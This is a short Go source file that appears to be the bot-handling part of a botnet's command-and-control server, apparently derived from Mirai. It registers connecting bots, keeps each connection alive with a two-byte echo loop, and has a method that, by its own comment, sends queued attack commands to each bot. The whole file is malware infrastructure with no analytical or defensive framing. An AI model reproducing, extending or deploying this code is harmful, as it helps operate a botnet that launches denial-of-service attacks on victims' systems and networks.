/*

*/

package main

import (
    "net"
    "time"
)

type Bot struct {
    uid     int
    conn    net.Conn
    version byte
    source  string
}

func NewBot(conn net.Conn, version byte, source string) *Bot {
    return &Bot{-1, conn, version, source}
}


/*
Called by initialHandler in main.go, when new bot connects to C&C
*/
func (this *Bot) Handle() {
    clientList.AddClient(this)
    defer clientList.DelClient(this)

    buf := make([]byte, 2)
    for {
        this.conn.SetDeadline(time.Now().Add(180 * time.Second))
        if n,err := this.conn.Read(buf); err != nil || n != len(buf) {
            return
        }
        if n,err := this.conn.Write(buf); err != nil || n != len(buf) {
            return
        }
    }
}

/* C&C send queued attack command to each bot */
func (this *Bot) QueueBuf(buf []byte) {
    this.conn.Write(buf)
}
